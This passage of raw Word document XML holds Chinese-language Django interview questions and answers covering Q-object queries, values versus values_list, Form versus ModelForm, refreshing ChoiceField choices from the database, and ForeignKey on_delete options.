      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1) | Q(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>条件</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">2) </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC5522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Q(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>条件</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1) &amp; Q(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>条件</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">2) </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>且</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048E0E07" w14:textId="0D6218AF"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Q(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>条件</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1) &amp; ~Q(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>条件</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">2) </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>非</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BCD857" w14:textId="6F36966B"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035</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values</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values_list</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC46B7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values(self, *fields):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5C1A6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获取每行数据为字典格式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216E07F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535203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values_list(self, *fields, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3221DDB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获取每行数据为元祖</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA6AAF5" w14:textId="16903F38"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lastRenderedPageBreak/>
        <w:t>037</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的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Form</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ModeForm</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F92BA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作用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690C9DC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对用户请求数据格式进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240DBBA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自动生成</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE4BFC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区别：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9DDB0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Form</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，字段需要自己手写。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E996E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class Form(Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394F0E8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xx = fields.CharField(.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EE5A5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xx = fields.CharField(.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0CA60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xx = fields.CharField(.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F494B8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xx = fields.CharField(.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E2773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ModelForm</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，可以通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Meta</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>进行定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500473A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class MForm(ModelForm):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D51B5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class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B85C9D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fields = "__all__"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069E228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model = UserInfo                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B15656" w14:textId="0AF9D99B"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应用：只要是客户端向服务端发送表单数据时，都可以进行使用，如：用户登录注册</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316273AA" w14:textId="2C81DBF1"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38.django</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组件中，如果字段中包含</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>choices</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数，请使用两种方式实现数据源实时更新。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FC10B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方式一</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重写构造方法，在构造方法中重新去数据库获取值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6919C25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class UserForm(Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C40CA7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name = fields.CharField(label='</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用户名</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>',max_length=32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA2EDD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email = fields.EmailField(label='</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>邮箱</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118A87E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ut_id = fields.ChoiceField(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8C711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choices=[(1,'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>普通用户</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'),(2,'IP</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用户</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DABCA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choices=[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A84D30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49F698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2A0920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__init__(self,*args,**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350DCCB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super(UserForm,self).__init__(*args,**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7248B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45D5B7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self.fields['ut_id'].choices = models.UserType.objects.all().values_list('id','title')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE0FF50"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1C8AD826" w14:textId="31699E0C"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方式二</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>: ModelChoiceField</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1592DD3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from django.forms import Form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3D04F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from django.forms import fields</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F4088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from django.forms.models import ModelChoiceField</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF77DC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class UserForm(Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA2171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name = fields.CharField(label='</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用户名</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>',max_length=32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175D6DC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email = fields.EmailField(label='</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>邮箱</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7648641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ut_id = ModelChoiceField(queryset=models.UserType.objects.all())    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5235DF6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77C7C8F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依赖：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4676343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class UserType(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBE766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title = models.CharField(max_length=32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D1256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A9403E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__str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6BE16F" w14:textId="24AF5A88"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self.title</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFA3104" w14:textId="624327FD"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039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的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>ForeignKey</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>字段中的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>on_delete</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>参数有什么作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351964D1" w14:textId="2182169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在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django2.0</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>后，定义外键和一对一关系的时候需要加</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>on_delete</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>选项，此参数为了避免两个表里的数据不一致问题，不然会报错：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111C9941" w14:textId="27AC8BF6"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TypeError: __init__() missing 1 required positional argument: 'on_delete'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A974FD3" w14:textId="0D91A67C"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举例说明：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E5A5A6" w14:textId="60A74F14"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user=models.OneToOneField(User)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3143C17E" w14:textId="7501C9CA"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owner=models.ForeignKey(UserProfile)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C006905" w14:textId="42B3564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需要改成：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B2388C" w14:textId="49043D60"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user=models.OneToOneField(User,on_delete=models.CASCADE)          --</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在老版本这个参数（</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>models.CASCADE</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）是默认值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3130288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owner=models.ForeignKey(UserProfile,on_delete=models.CASCADE)    --</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在老版本这个参数（</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>models.CASCADE</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）是默认值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECDA28A" w14:textId="7F0A4BA0"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参数说明：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F55B52B" w14:textId="6107B07B"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on_delete</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>有</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CASCADE</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PROTECT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SET_NULL</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SET_DEFAULT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SET()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>五个可选择的值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4614280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CASCADE</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：此值设置，是级联删除。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E50AD0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PROTECT</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：此值设置，是会报完整性错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480A8B2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SET_NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：此值设置，会把外键设置为</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，前提是允许为</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
